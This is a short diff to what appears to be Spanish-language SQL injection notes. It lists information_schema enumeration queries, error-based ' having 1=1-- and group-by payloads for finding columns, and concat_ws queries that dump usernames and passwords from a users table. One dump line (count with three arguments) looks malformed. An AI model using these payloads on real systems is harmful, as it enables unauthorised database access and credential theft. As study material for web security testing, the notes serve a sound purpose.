@@ -221,11 +221,12 @@ concat_ws(':',id, username, password)
 Getting tables in current Database
 	select table_name from information_schema.tables where table_schema=database() limit 0,1
 Columns
-	select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1
+	select column_name from information_schema.columns where table_schema=database() and table_name='users' (o la que queramos ver) limit 0,1
 Count number of columns
 	select count(username) from users
 Dump
 	select count(username,0x3a,password) from users limit 0,1
+	concat_ws(0x7e,id, username, password)
 
 Enumeración de columnas:
 ' having 1=1-- al no tener el group by, dará error y puede mostrar la columna. Después hacemos ' group by [tabla.columna mostrada] having 1=1-- y mostrará la siguiente. Después concatenamos ' group by [tabla.columna mostrada], [tabla.columna mostrada2] having 1=1-- Hasta que no dé error
